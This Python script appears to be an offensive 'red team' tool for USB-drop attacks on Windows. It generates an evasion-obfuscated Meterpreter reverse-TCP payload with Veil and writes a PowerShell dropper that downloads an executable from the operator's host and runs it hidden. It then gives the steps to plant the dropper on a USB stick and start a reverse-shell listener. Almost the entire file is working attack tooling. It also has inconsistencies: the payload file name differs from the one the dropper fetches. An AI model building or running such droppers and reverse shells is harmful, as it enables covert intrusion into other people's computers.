#!/usr/bin/env python3

import subprocess
import sys
import time
import os
import logging

DROPPUNK_LOGO = """
   ██████╗ ██████╗  ██████╗ ██████╗ ██████╗ ██╗   ██╗███╗   ██╗██╗  ██╗
   ██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██╔══██╗██║   ██║████╗  ██║██║ ██╔╝
   ██║  ██║██████╔╝██║   ██║██████╔╝██████╔╝██║   ██║██╔██╗ ██║█████╔╝ 
   ██║  ██║██╔══██╗██║   ██║██╔═══╝ ██╔══██╗██║   ██║██║╚██╗██║██╔═██╗ 
   ██████╔╝██║  ██║╚██████╔╝██║     ██║  ██║╚██████╔╝██║ ╚████║██║  ██╗
   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝
   -----------------------------------------------------------------------
      DROPPUNK - Red Team Physical Drop Tool | USB Reverse Shell | Kali
   -----------------------------------------------------------------------
"""

logging.basicConfig(filename="droppunk.log", level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
logger = logging.getLogger("DropPunk")

LHOST = input("Enter your public IP or hostname: ").strip()
LPORT = "4444"
PAYLOAD_FILE = "/tmp/droppunk_veil.exe"
DROPPER_FILE = "droppunk.ps1"

def generate_veil_payload():
    try:
        logger.info(f"Generating Veil payload: {PAYLOAD_FILE}")
        veil_cmd = f"use Evasion\nuse windows/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nset use_arya Y\ngenerate\nset output_file {PAYLOAD_FILE}\nexecute\nexit"
        with open("veil.rc", "w") as f:
            f.write(veil_cmd)
        subprocess.run(["veil", "-r", "veil.rc"], check=True)
        if not os.path.exists(PAYLOAD_FILE):
            raise FileNotFoundError
        logger.info(f"Payload generated: {PAYLOAD_FILE}")
    except Exception as e:
        logger.error(f"Payload generation failed: {e}")
        sys.exit(1)

def generate_dropper():
    try:
        dropper_script = f"IWR -Uri 'http://{LHOST}/droppunk.exe' -OutFile '$env:TEMP\\dp.exe'; Start-Process '$env:TEMP\\dp.exe' -WindowStyle Hidden"
        with open(DROPPER_FILE, "w") as f:
            f.write(dropper_script)
        logger.info(f"Dropper generated: {DROPPER_FILE}")
    except Exception as e:
        logger.error(f"Dropper failed: {e}")
        sys.exit(1)

def main():
    print(DROPPUNK_LOGO)
    logger.info("DropPunk initialized")
    
    generate_veil_payload()
    generate_dropper()
    
    print(f"[!] Host {PAYLOAD_FILE} at /tmp (e.g., 'python3 -m http.server 80')")
    print(f"[!] Copy {DROPPER_FILE} to USB as 'autorun.ps1'")
    print("[!] Start listener: 'nc -lvp 4444' or Metasploit")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("User interrupted")
        for f in ["veil.rc", DROPPER_FILE]:
            if os.path.exists(f):
                os.remove(f)
        sys.exit(0)

if __name__ == "__main__":
    main()